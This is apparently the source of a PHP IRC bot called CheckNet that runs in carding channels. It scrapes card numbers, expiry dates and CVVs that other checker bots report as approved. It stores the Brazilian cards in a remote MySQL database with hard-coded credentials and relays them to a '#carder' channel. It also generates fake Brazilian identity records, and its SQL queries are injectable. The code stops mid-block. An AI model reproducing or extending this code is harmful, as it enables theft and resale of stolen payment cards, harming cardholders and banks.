<?php

// SCRIPTS
require('scripts/luhn.php');
require('scripts/4devs.php');
require('scripts/bin.php');
require('scripts/sro.php');
require('scripts/temp-mail.php');

// VARIAVEIS
$version = "2.0";
$release = "23/07/2019";
$NAMESERVER = php_uname('n');
$CPUdistro = php_uname('a');

// GUEST AUTOBAN JOIN/CHANGE
$nickGuestJOIN = true;
$nickGuestCHANGE = true;

// SETUP ON/OFF SERVICES
$checkerGGBB = true;
$checkerGGELO = false;
$checkerFULL = false;
$consultaCADSUS = true;

// SETUP ON/OFF AUTOVOICE
$autovoice = false;

// PHP VARS
ini_set('default_charset','UTF-8');

//
// Funções CheckNet PHP Bot
//

function Uptime(){
    $str   = @file_get_contents('/proc/uptime');
    $num   = floatval($str);
    $secs  = $num % 60;      $num = intdiv($num, 60);
    $mins  = $num % 60;      $num = intdiv($num, 60);
    $hours = $num % 24;      $num = intdiv($num, 24);
    $days  = $num;

    return $days." DIAS ".$hours." HORAS ".$mins." MINUTOS ".$secs." SEGUNDOS";
}

function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

function limpaString($string){
    $newSTRING = str_replace('<td>
', '', $string);
    return $newSTRING;
}

function captureBR($ccnr,$ccmes,$ccano,$cccvv,$ccbanco,$ccnivel,$cctipo,$ccbandeira,$ccnick){
    $DBHOSTNAME     =	"104.41.35.149";
    $DBUSERNAME     =	"checknet";
    $DBPASSWORD     =	"whoami357";
    $DBCAPTURE      =	"capture";

    $mysqli = new MySQLi($DBHOSTNAME, $DBUSERNAME, $DBPASSWORD, $DBCAPTURE);
    if($mysqli->connect_error){
        echo "Desconectado! Erro: " . $mysqli->connect_error . "\n";
    }else{
        $inserir = $mysqli->query("INSERT INTO ccbrazil (cc_numero, cc_mes, cc_ano, cc_cvv, cc_banco, cc_nivel, cc_tipo, cc_bandeira, cc_nick) VALUES ('$ccnr', '$ccmes', '$ccano', '$cccvv', '$ccbanco', '$ccnivel', '$cctipo', '$ccbandeira', '$ccnick')");
        if(!$inserir){ echo 'Erro: ', $inserir->error . "\n"; }
    }
    mysqli_close($mysqli);
}

function IPlookup($ip){
    $curl = curl_init();
    $lookupURL = "https://www.ip-tracker.org/locator/ip-lookup.php?ip=" . $ip;
    curl_setopt($curl, CURLOPT_URL, $lookupURL);
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($curl);
    curl_close($curl);
    return $output;
}

function pegaIp() {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "http://alkanas.com/ip.php");
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    $output = curl_exec($curl);
    curl_close($curl);
    return $output;
}

//
// MySQL
//

function VerificaCliente($nickirc, $identd, $hostirc){
	echo "NICK: $nickirc \nIDENTD: $identd \nHOSTNAME: $hostirc \n\n";

	$DBHOSTNAME     =	"104.41.35.149";
	$DBUSERNAME     =	"checknet";
	$DBPASSWORD     =	"whoami357";
	$DBPERMITIDOS   =	"chknet";

	$mysqli = new MySQLi($DBHOSTNAME, $DBUSERNAME, $DBPASSWORD, $DBPERMITIDOS);

	// VERIFICA NO DB
	$result = $mysqli->query("SELECT * FROM `carder-usuarios` WHERE `user_nick` = '".$nickirc."'");
	if ($result->num_rows == 1) {
		$info = $result->fetch_array(MYSQLI_BOTH);
		if ($identd == $info["user_identd"] && $hostirc == $info["user_hostname"]) {
			fputs($GLOBALS['socket'], "MODE #CARDER +v ".$nickirc."\n");
			return true;
		} else { return false; }
	} else { return false; }
}

function EfetuaLogin($login, $password, $identd, $hostirc, $nickirc){
	$DBHOSTNAME     =	"104.41.35.149";
	$DBUSERNAME     =	"checknet";
	$DBPASSWORD     =	"whoami357";
	$DBPERMITIDOS   =	"chknet";

	$mysqli = new MySQLi($DBHOSTNAME, $DBUSERNAME, $DBPASSWORD, $DBPERMITIDOS);

	// VERIFICA NO DB
	$result = $mysqli->query("SELECT * FROM `carder-clientes` WHERE `cliente_email` = '".$login."' AND `cliente_password` = '".$password."'");
	// SE TIVER O USUARIO
        if ($result->num_rows == 1) {
		$result2 = $mysqli->query("UPDATE `carder-usuarios` SET `user_identd` = '".$identd."', `user_hostname` = '".$hostirc."' WHERE `user_nick` = '".$nickirc."'");
		$result3 = $mysqli->query("UPDATE `carder-clientes` SET `cliente_identd` = '".$identd."', `cliente_host` = '".$hostirc."' WHERE `cliente_nick` = '".$nickirc."'");
		fputs($GLOBALS['socket'], "PRIVMSG $nickirc :[IDENTIFY] IDENTIFICAÇÃO EFETUADA COM SUCESSO!\n");
		fputs($GLOBALS['socket'], "MODE #CARDER +v ".$nickirc."\n");
	} else {
		fputs($GLOBALS['socket'], "PRIVMSG $nickirc :[IDENTIFY] ERRO NA TENTATIVA DE IDENTIFICAR!\n");
	}
}

//
// IRC
//

// Prevent PHP from stopping the script after 30 sec
	set_time_limit(0);

// VARIAVEIS
	$nickname   = 'CheckNet';
	$master     = 'Norah_C_IV';

// Opening the socket to the CHKnet network
	$socket = fsockopen("irc.chknet.cc", "6667", $errno, $errstr);
	echo $errstr;

// Send auth info
	fputs($socket,"USER ".$nickname." 0 * : [".$NAMESERVER."] Coded By Norah_C_IV\n");
	fputs($socket,"NICK ".$nickname."\n");

// Force an endless while
while(1) {

	// Continue the rest of the script here
	while($data = fgets($socket, 512)) {

		//DEBUG
		//print_r($data);

		flush();

		// Separate all data
		$ex = explode(' ', $data);

		// Send PONG back to the server
		if($ex[0] == "PING"){
			fputs($socket, "PONG ".$ex[1]."\n");
		}
		// autoIDENTIFY
		if($ex[0] == ":NickServ!services@services.chknet" && $ex[6] == "registered") {
                        fputs($socket, "PRIVMSG NickServ :identify norah235144\n");
		}
		// autoJOIN
		if($ex[0] == ":NickServ!services@services.chknet" && $ex[4] == "accepted") {
                        fputs($socket,"JOIN #brazil\n");
                        fputs($socket,"JOIN #carder\n");
			fputs($socket,"JOIN #jcheck\n");
                        fputs($socket,"JOIN #alternative\n");
                        fputs($socket,"JOIN #payment\n");
                        fputs($socket,"JOIN #check\n");
                        fputs($socket,"JOIN #cctools\n");
			fputs($socket,"JOIN #check\n");
		}
		// VIADEX #brazil
		if($ex[0] == ":chkViadex24!bot@chkViadex24PontoCom" && $ex[1] == "PRIVMSG" && $ex[2] == "#brazil"){
			$posSTATUS = strpos($ex[4], "APROVADA");
			if($posSTATUS === false) {
			} else {
				$exCC = explode('|', $data);
				$exINFO = explode('»', $exCC[0]);
				$exCC = str_replace(" ", "", $exINFO[1]);
				$exMES = str_replace(" ", "", $exINFO[2]);
				$exANO = str_replace(" ", "", $exINFO[3]);
				$exCVV = str_replace(" ", "", $exINFO[4]);
				$nicktmp = getStr($ex[3], "<", ">");
				$tempBIN = substr($exCC, 0, 6);
				$dadosBIN = pegaBin($tempBIN);
				$jsonSCHEME = $dadosBIN[7];
				$jsonBRAND = $dadosBIN[9];
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
					fputs($socket, "PRIVMSG $master :[CAPTURE LIVE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
				}
				fputs($socket, "PRIVMSG #carder :[CAPTURE LIVE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #brazil \n");
			}
		}
		// JMerchant #jcheck
		if($ex[0] == ":JMerchant!~JMerchant@JMerch.ChkNet.Bot" && $ex[1] == "PRIVMSG" && $ex[2] == "#jcheck") {
			$posSTATUS = strpos($data, "SUCSS ✔");
			if($posSTATUS === false) {
			} else {
				$exCC = $ex[5];
				$exMES = $ex[7];
				$exANO = $ex[9];
				$exCVV = $ex[11];
				$nicktmp = str_replace(':', '', str_replace("12", "", $ex[3]));
				$tempBIN = substr($ex[5], 0, 6);
				$dadosBIN = pegaBin($tempBIN);
				$jsonSCHEME = $dadosBIN[7];
				$jsonBRAND = $dadosBIN[9];
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"JMerchant");
					fputs($socket, "PRIVMSG $master :[CAPTURE LIVE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #jcheck \n");
				}
				fputs($socket, "PRIVMSG #carder :[CAPTURE LIVE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #jcheck \n");
			}
		}
		// DjRogerinhoBOT #alternative
		if($ex[0] == ":DjRogerinhoBOT!~DjRogerin@xvideos.com" && $ex[1] == "PRIVMSG" && $ex[2] == "#alternative") {
			$posSTATUS = strpos($data, "[00 - APROVADA]");
			if($posSTATUS === false) {
			} else {
				$exCC = $ex[14];
				$exMES = $ex[16];
				$exANO = substr($ex[18], 2, 2);
				$exCVV = $ex[20];
				$nicktmp = getStr($ex[3], "<", ">");
				$tempBIN = substr($ex[14], 0, 6);
				$dadosBIN = pegaBin($tempBIN);
				$jsonSCHEME = $dadosBIN[7];
				$jsonBRAND = $dadosBIN[9];
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"DjRogerinhoBOT");
					fputs($socket, "PRIVMSG $master :[CAPTURE LIVE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO."\n");
					}
				fputs($socket, "PRIVMSG #carder :[CAPTURE LIVE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO."\n");

			}
		}
		// B4nk #payment
		if($ex[0] == ":B4nk!~SECURITY@1442D50B.21F1877E.C294562E.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#payment"){
			$posSTATUS = strpos($ex[11], "APPROVED");
			if($posSTATUS === false) {
				print_r($ex);
			} else {
				$exCC = $ex[5];
				if (strlen($ex[6]) == 3) { $exDATAtemp = "0".$ex[6]; }
				else { $exDATAtemp = $ex[6]; }
				$exMES = substr($exDATAtemp, 0, 2);
				$exANO = substr($exDATAtemp, 2, 2);
				$exCVV = $ex[7];
				$tempBIN = substr($ex[5], 0, 6);
				$dadosBIN = pegaBin($tempBIN);
				$nicktmp = str_replace('', '', $ex[5]);
				$jsonSCHEME = $dadosBIN[7];
				$jsonBRAND = $dadosBIN[9];
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],"B4nk");
					fputs($socket, "PRIVMSG $master :[CAPTURE LIVE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #payment \n");
					}
				fputs($socket, "PRIVMSG #carder :[CAPTURE LIVE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [B4nk] [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #payment \n");
			}
		}
		// ChkNet #unix
		if($ex[0] == ":ChkNet!ChkNet@B7E9A087.ABEF7087.99DF22F4.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#unix"){
			$posSTATUS = strpos($ex[11], "Approval");
			if($posSTATUS === false) {
			} else {
				$exCC = str_replace("", "", $ex[4]);
				$exTEMP = str_replace('', '', $ex[5]);
				$exMES = substr($exTEMP, 0, 2);
				$exANO = substr($exTEMP, 2, 2);
				$exCVV = $ex[6];
				$tempBIN = substr($exCC, 0, 6);
				$dadosBIN = pegaBin($tempBIN);
				$nicktmp = str_replace(":", "", str_replace(",", "", $ex[3]));
				$jsonSCHEME = $dadosBIN[7];
				$jsonBRAND = $dadosBIN[9];
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				fputs($socket, "PRIVMSG #carder :[CAPTURE LIVE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #unix \n");
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
					fputs($socket, "PRIVMSG $master :[CAPTURE LIVE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #unix \n");
				}
			}
		}
		// CheckBOT #cctools
		if($ex[0] == ":CheckBOT!~CheckBOT@Developer.FurkanTR" && $ex[1] == "PRIVMSG" && $ex[2] == "#cctools"){
			$posSTATUS = strpos($ex[14], "APPROVED");
			if($posSTATUS === false) {
			} else {
				$exCC = str_replace("1503", "", $ex[7]);
				$exMES = $ex[8];
				$exANO = substr($ex[9], 2, 2);
				$exCVV = $ex[10];
				$tempBIN = substr($exCC, 0, 6);
				$dadosBIN = pegaBin($tempBIN);
				$nicktmp = str_replace("00", "", str_replace("07", "", $ex[5]));
				$jsonSCHEME = $dadosBIN[7];
				$jsonBRAND = $dadosBIN[9];
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				fputs($socket, "PRIVMSG #carder :[CAPTURE LIVE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #cctools \n");
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
					fputs($socket, "PRIVMSG $master :[CAPTURE LIVE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #cctools \n");
				}
			}
		}
		// Freechk #check
		if($ex[0] == ":Freechk!~authorize@AC5A5AF6.EF3F9A09.7DC749EA.IP" && $ex[1] == "PRIVMSG" && $ex[2] == "#check"){
			$posSTATUS = strpos($ex[12], "APPROVED");
			if($posSTATUS === false) {
			} else {
				$exCC = $ex[6];
				$exMES = substr($ex[7], 0, 2);
				$exANO = substr($ex[7], 2, 2);
				$exCVV = $ex[8];
				$nicktmp = $ex[4];
				$tempBIN = substr($ex[6], 0, 6);
				$dadosBIN = pegaBin($tempBIN);
				$jsonSCHEME = $dadosBIN[7];
				$jsonBRAND = $dadosBIN[9];
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
					fputs($socket, "PRIVMSG $master :[CAPTURE LIVE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] #check \n");
					}
				fputs($socket, "PRIVMSG #carder :[CAPTURE LIVE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] #check \n");
			}
		}
		// OwnChk #unix and #payment
		if($ex[0] == ":OwnChk!~IamAwesom@msg.independent.for.premium" && $ex[1] == "PRIVMSG"){
			$posSTATUS = strpos($ex[12], "APPROVED");
			if($posSTATUS === false) {
			} else {
				$exCC = $ex[6];
				$exMES = substr($ex[7], 0, 2);
				$exANO = substr($ex[7], 2, 2);
				$exCVV = $ex[8];
				$nicktmp = $ex[4];
				$tempBIN = substr($ex[6], 0, 6);
				$dadosBIN = pegaBin($tempBIN);
				$jsonSCHEME = $dadosBIN[7];
				$jsonBRAND = $dadosBIN[9];
				$jsonNAME = convertCountry($dadosBIN[6]);
				$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
				if($jsonNAME == "BRAZIL") {
					captureBR($exCC,$exMES,$exANO,$exCVV,$binBANCO,$dadosBIN[9],$dadosBIN[8],$dadosBIN[7],$nicktmp);
					fputs($socket, "PRIVMSG $master :[CAPTURE LIVE] ".$exCC." ".$exMES.$exANO." ".$exCVV." [NÍVEL] ".$jsonBRAND." [PAÍS] ".$jsonNAME." [BANCO] ".$binBANCO." [CANAL] $ex[2] \n");
					}
				fputs($socket, "PRIVMSG #carder :[CAPTURE LIVE] → ".$exCC." ".$exMES.$exANO." ".$exCVV." [PAÍS] ".$jsonNAME." [NICK] ".$nicktmp." [NÍVEL] ".$jsonBRAND." [BANCO] ".$binBANCO." [CANAL] $ex[2] \n");
			}
		}
		// COMANDOS ADMIN
		// :JBiLTDA!t7DS@jbiltda.kiprest.com.br PRIVMSG CheckNet :!ip
		if($ex[1] == "PRIVMSG" && $ex[2] == $nickname){
			$comando = str_replace(":!", "", preg_replace('/\s+/', '', $ex[3]));
			$nicktmp = explode('!', $ex[0]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$identdtmp = $hosttmp[0];
			switch ($comando) {
			    case auth:
			        if(isset($ex[4]) && isset($ex[5])) {
					$eMAIL	= trim($ex[4]);
					$pASSWD	= md5(preg_replace('/\s+/', '', $ex[5]));
					EfetuaLogin($eMAIL, $pASSWD, $identdtmp, $hosttmp[1], $nickCMD);
				}
			        break;
			    case status:
				if($checkerGGBB) { $statusGGBB = "3HABILITADO"; } else { $statusGGBB = "4DESABILITADO"; }
				if($checkerGGELO) { $statusGGELO = "3HABILITADO"; } else { $statusGGELO = "4DESABILITADO"; }
				if($checkerFULL) { $statusFULL = "3HABILITADO"; } else { $statusFULL = "4DESABILITADO"; }
				if($consultaCADSUS) { $statusconsulta = "3HABILITADO"; } else { $statusconsulta = "4DESABILITADO"; }
				fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] GERADAS BB [$statusGGBB] GERADAS ELO [$statusGGELO] CHECKER FULL [$statusFULL] CONSULTA NOME/CPF [$statusconsulta] \n");
			        break;
			    case version:
			        fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → CheckNet IRC PHP7 BOT [VERSÃO] $version (BETA) ATUALIZADO [$release]\n");
			        break;
			    case dados:
				$dados = json_decode(GeraPessoa());
			        fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [NOME] $dados->nome [CPF] $dados->cpf [RG] $dados->rg [NASCIMENTO] $dados->data_nasc [CEP] $dados->cep [RUA] $dados->endereco, $dados->numero [BAIRRO] $dados->bairro [CIDADE] $dados->cidade [ESTADO] $dados->estado [TELEFONE] $dados->celular\n");
			        break;
			    case bin:
				if (isset($ex[4]) && strlen(preg_replace('/\s+/', '', $ex[4])) >= 6) {
					$tempBIN = substr($ex[4], 0, 6);
					$dadosBIN = pegaBin($tempBIN);
					$jsonSCHEME = $dadosBIN[7];
					$jsonNAME = convertCountry($dadosBIN[6]);
					$jsonTYPE = $dadosBIN[8];
					$jsonBRAND = $dadosBIN[9];
					$binBANCO = str_replace("</td></tr></table>", "", $dadosBIN[10]);
					fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [BIN] $tempBIN [BANDEIRA] $jsonSCHEME [PAÍS] $jsonNAME [BANCO] $binBANCO [TIPO] $jsonTYPE [CATEGORIA] $jsonBRAND \n");
				} elseif (strlen($ex[4]) < 6) {
					fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. ( Exemplo: !bin 552289 )\n");
				} else {
					fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [ERRO] Bin deve conter 6 numeros. ( Exemplo: !bin 552289 )\n");
				}
			        break;
			    case lookup:
				if ($comando == "lookup") {
				if (isset($ex[4]) && strlen($ex[4]) >= 7) {
					$lookup = IPlookup(preg_replace('/\s+/', '', $ex[4]));
					$reverseDNS = limpaString(getStr($lookup,'<th>Reverse DNS:</th>','</td>'));
					$country = getStr($lookup, 'Country:</th><td> ', ' &nbsp;&nbsp;');
					$state = str_replace("<td class='tracking'>", '', str_replace("<td class='tracking lessimpt'>", '', getStr($lookup, 'State:</th>', '</td>')));
					$city = str_replace('<td> ', '', str_replace("<td class='vazno'>", '', getStr($lookup, 'City Location:</th>', '</td>')));
					$isp = getStr($lookup, 'ISP:</th><td>', '</td>');
					$asnumber = getStr($lookup, 'AS Number:</th><td>', '</td>');
					$iphostname = str_replace("<td class='tracking'>", '', getStr($lookup, 'Hostname:</th> ', '</td><'));
                                        fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [IP-LOOKUP] ".preg_replace('/\s+/', '', $ex[4])." [HOSTNAME] $iphostname [ISP] $isp [PAÍS] $country [ESTADO] $state [CIDADE] $city [AS] $asnumber\n");
                                } else { fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → Insira o IP para consulta ( Exemplo: !lookup 191.189.23.192 )\n"); } }
                                break;
			}
			if ($ex[0] == ":Norah_C_IV!~Norah_C_IV@Carding-Network.onion" || $ex[0] == ":GENEILTON01!~GENEILTON@FR13ND.COM" || $ex[0] == ":JBiLTDA!t7DS@jbiltda.kiprest.com.br") {
			    switch ($comando) {
			    case comandos:
				fputs($socket, "PRIVMSG $nickCMD :[LISTA DE COMANDOS ADMIN]\n");
				fputs($socket, "PRIVMSG $nickCMD :!disableCheckGGBB - Desativa Checker GERADAS Banco do Brasil!\n");
				fputs($socket, "PRIVMSG $nickCMD :!disableCheckELO - Desativa Checker GERADAS ELO\n");
				fputs($socket, "PRIVMSG $nickCMD :!disableCheckFULL - Desativa Checker FULL\n");
				fputs($socket, "PRIVMSG $nickCMD :!disableAutoVoice - Desativa AutoVoice no #CARDER\n");
				fputs($socket, "PRIVMSG $nickCMD :!disableCADSUS - Desativa consulta NOME/CPF\n");
				fputs($socket, "PRIVMSG $nickCMD :!disableGuestJOIN - Desativa banimento de Guest\n");
				fputs($socket, "PRIVMSG $nickCMD :!disableGuestCHANGE - Desativa banimento de mudança de nick para Guest\n");
				fputs($socket, "PRIVMSG $nickCMD :!enableCheckGGBB - Ativa Checker GERADAS Banco do Brasil\n");
				fputs($socket, "PRIVMSG $nickCMD :!enableCheckELO - Ativa Checker GERADAS ELO\n");
				fputs($socket, "PRIVMSG $nickCMD :!enableCheckFULL - Ativa Checker FULL\n");
				fputs($socket, "PRIVMSG $nickCMD :!enableAutoVoice - Ativa AutoVoice no #CARDER\n");
				fputs($socket, "PRIVMSG $nickCMD :!enableCADSUS - Ativa consulta NOME/CPF\n");
				fputs($socket, "PRIVMSG $nickCMD :!enableGuestJOIN - Ativa banimento de Guest\n");
				fputs($socket, "PRIVMSG $nickCMD :!enableGuestCHANGE - Ativa banimento de mudança de nick para Guest\n");
			        break;
			    case disableCheckELO:
				$checkerGGELO = false;
				fputs($socket, "PRIVMSG #carder :[4DESABILITADO] Checker de GERADAS ELO!\n");
			        break;
			    case enableCheckELO:
				$checkerGGELO = true;
				fputs($socket, "PRIVMSG #carder :[3HABILITADO] Checker de GERADAS ELO!\n");
			        break;
			    case disableAutoVoice:
				$autovoice = false;
				fputs($socket, "PRIVMSG #carder :[4DESABILITADO] Auto Voice no CARDER!\n");
			        break;
			    case enableAutoVoice:
				$autovoice = true;
				fputs($socket, "PRIVMSG #carder :[3HABILITADO] Auto Voice no CARDER!\n");
			        break;
			    case disableCheckGGBB:
				$checkerGGBB = false;
				fputs($socket, "PRIVMSG #carder :[4DESABILITADO] Checker de GERADAS BANCO DO BRASIL!\n");
			        break;
			    case disableCheckFULL:
				$checkerFULL = false;
				fputs($socket, "PRIVMSG #carder :[4DESABILITADO] Checker de FULL!\n");
			        break;
			    case disableCADSUS:
				$consultaCADSUS = false;
				fputs($socket, "PRIVMSG #carder :[4DESABILITADO] Consulta NOME/CPF!\n");
			        break;
			    case disableGuestJOIN:
				$nickGuestJOIN = false;
				fputs($socket, "PRIVMSG #carder :[4DESABILITADO] Banimento automático de Guest/AndroUser!\n");
			        break;
			    case disableGuestCHANGE:
				$nickGuestCHANGE = false;
				fputs($socket, "PRIVMSG #carder :[4DESABILITADO] Banimento automático de mudança de nick para Guest/AndroUser!\n");
			        break;
			    case enableGuestJOIN:
				$nickGuestJOIN = true;
				fputs($socket, "PRIVMSG #carder :[3HABILITADO] Banimento automático de Guest/AndroUser!\n");
			        break;
			    case enableGuestCHANGE:
				$nickGuestCHANGE = true;
				fputs($socket, "PRIVMSG #carder :[3HABILITADO] Banimento automático de mudança de nick para Guest/AndroUser!\n");
			        break;
			    case enableCheckGGBB:
				$checkerGGBB = true;
				fputs($socket, "PRIVMSG #carder :[3HABILITADO] Checker de GERADAS BANCO DO BRASIL!\n");
			        break;
			    case enableCheckFULL:
				$checkerFULL = true;
				fputs($socket, "PRIVMSG #carder :[3HABILITADO] Checker de FULL!\n");
			        break;
			    case enableCADSUS:
				$consultaCADSUS = true;
				fputs($socket, "PRIVMSG #carder :[3HABILITADO] Consulta NOME/CPF!\n");
			        break;
			    case ban:
				$toBan = preg_replace('/\s+/', '', $ex[4]);
				if(isset($ex[4]) && $ex[4] != "") {
					fputs($socket, "MODE #carder +b $toBan\n");
				}
			    case kick:
				$toKick = preg_replace('/\s+/', '', $ex[4]);
				if(isset($ex[4]) && $ex[4] != "") {
					fputs($socket, "KICK #carder ".$toKick." :KICK REQUEST [$nickCMD]\n");
				}
			        break;
			    case join:
				$toJoin = preg_replace('/\s+/', '', $ex[4]);
				if(isset($ex[4]) && $ex[4] != "") {
					fputs($socket, "JOIN $toJoin \n");
				}
			        break;
			    case part:
				$toPart = preg_replace('/\s+/', '', $ex[4]);
				if(isset($ex[4]) && $ex[4] != "") {
					fputs($socket, "PART $toPart \n");
				}
			        break;
			    case ip:
				$meuIP = pegaIp();
				fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] → [IP] $meuIP \n");
			        break;
			    }
			} else { fputs($socket, "PRIVMSG $nickCMD :[11$nickCMD] 4USUARIO NÃO AUTORIZADO!\n"); }
		}
		// AUTOVOICE PARA MEMBROS NO #CARDER
		if($ex[1] == "JOIN" && isset($ex[2]) && strpos(strtoupper($ex[2]), '#CARDER')){
			$nicktmp = explode('!', $ex[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			$chantmp = str_replace(":#", "", $ex[2]);
			$chanCMD = preg_replace('/\s+/', '', $chantmp);
			$identdtmp = $hosttmp[0];
			VerificaCliente($nickCMD, $identdtmp, $hosttmp[1]);
		}
		// AUTOVOICE @ #CARDER
		if($ex[1] == "JOIN" && isset($ex[2]) && $autovoice){
			$nicktmp = explode('!', $ex[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			$chantmp = str_replace(":#", "", $ex[2]);
			$chanCMD = preg_replace('/\s+/', '', $chantmp);
			if (strtoupper($chanCMD) == "CARDER" && $nickCMD != "Norah_C_IV" && $nickCMD != "CheckNet" && $nickCMD != "j4ckass") {
				fputs($socket, "MODE #CARDER +v ".$nickCMD."\n");
			}
		}
		// AUTOBAN JOIN (Guest & AndroUser)
		if($ex[1] == "JOIN" && isset($ex[2]) && $nickGuestJOIN){
			$nicktmp = explode('!', $ex[0]);
			$hosttmp = explode('@', $nicktmp[1]);
			$nickCMD = str_replace(":", "", $nicktmp[0]);
			$chantmp = str_replace(":#", "", $ex[2]);
			$chanCMD = preg_replace('/\s+/', '', $chantmp);
			$eGuest = substr($nickCMD, 0, 5);
			$eAndroUser = substr($nickCMD, 0, 9);
			if (strtoupper($chanCMD) == "CARDER") {
				if ($eGuest == "Guest") {
					fputs($socket, "KICK #CARDER ".$nickCMD." :Nick Guest não permitido!\n");
